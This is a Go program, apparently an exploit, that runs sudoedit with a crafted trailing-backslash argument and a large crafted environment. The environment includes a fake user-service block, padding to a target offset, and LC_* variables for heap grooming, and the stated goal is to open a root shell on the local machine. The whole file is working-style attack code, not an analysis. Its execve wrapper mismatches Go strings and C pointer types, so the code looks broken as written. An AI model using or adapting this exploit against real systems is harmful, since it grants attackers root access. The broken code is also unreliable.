package main

import (
  "fmt"
  "C"
  "github.com/rainycape/dl"
  //"os/exec"
  //"os"
  "log"
  //"syscall"
  //"bytes"
  //"strings"
)

/*
execve ejecuta el programa indicado por filename. filename debe ser un binario ejecutable, o bien un guion shell
(shell script) comenzando con una línea de la forma "#! intérprete [arg]" (conocida como shebang).
En el segundo caso, el intérprete debe ser un nombre de camino válido para un ejecutable que no sea
él mismo un guion y que será ejecutado con los argumentos [arg] (opcionales) más el archivo filename
a interpretar.

argv es un array de cadenas de argumentos pasados al nuevo programa. envp es un array de cadenas,
convencionalmente de la forma clave=valor, que se pasan como entorno al nuevo programa. Tanto argv
como envp deben terminar en un puntero nulo. El vector de argumentos y el entorno pueden ser accedidos por
la función "main" del programa invocado cuando se define como int main(int argc, char *argv[], char *envp[]).

*/
func execve(command string, args []string, envp []string) {
  
  lib, err := dl.Open("libc.so.6", 0)
  if err != nil {
    log.Fatalln(err)
  }
  defer lib.Close()
  
  var execve func(pathname *C.char, argv *[]C.char, envp *[]C.char) C.int
  lib.Sym("execve", &execve)
  
  execve(command, args, envp)
  
  fmt.Println(err)
}

func multiply_string(text string, repetition int) string {
  repeated_string := ""

  for i:=0; i < repetition; i++ {
    repeated_string += text
  }

  return repeated_string
}

func main() {

  // sudo path
  SUDO_PATH := "/usr/bin/sudo"

  // define offset
  TARGET_OFFSET_START := 0x780 // this is just an integer

  // define fake user service object (in order to override)
  // 0x18 == 24

  FAKE_USER_SERVICE_PART := [0x18 + 1]string{"\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "X/X1234\\"}
  const user_service_len = 325
  FAKE_USER_SERVICE := [user_service_len]string{}
  
  j := 0
  for i := 0; i < user_service_len; i++ {
    FAKE_USER_SERVICE[i] = FAKE_USER_SERVICE_PART[j]
    j = (j+1)%25
  }
  //fmt.Println(FAKE_USER_SERVICE)
  FAKE_USER_SERVICE[324] = "X/X1234"
  //fmt.Println(FAKE_USER_SERVICE)

  // define our environment (in order to modify it as we want and open a root shell)

  offset_len := TARGET_OFFSET_START + 0xf -8
  const env_extension_len = 6

  env_array := [user_service_len + 1 + env_extension_len]string{}

  offset := ""
  for i := 0; i<(offset_len - 1); i++ {
    offset += "Z"
  }
  offset += "\\"

  env_array[0] = offset
  for i := 0; i < user_service_len; i++ {
    env_array[i+1] = FAKE_USER_SERVICE[i]
  }

  env_extension := []string{
    "LC_CTYPE=C.UTF-8@" + multiply_string("A", 0x28)+";A=",
    "LC_NUMERIC=C.UTF-8@" + multiply_string("A", 0xd8),
    "LC_TIME=C.UTF-8@" + multiply_string("A", 0x28),
    "LC_COLLATE=C.UTF-8@" + multiply_string("A", 0x28),
    "LC_IDENTIFICATION=C.UTF-8@" + multiply_string("A", 0x78), //for filling holes from freed file buffer
    "TZ=:",
  }

  for i:=0; i < env_extension_len; i++ {
    env_array[1 + user_service_len + i] = env_extension[i]
  }

  argv := []string{"sudoedit", "-A", "-s", multiply_string("A", 0xe0) + "\\"}
  
  //argv := strings.Join(argv_array, " ")
  env := env_array[:]
  
  execve(SUDO_PATH, argv, env)
}
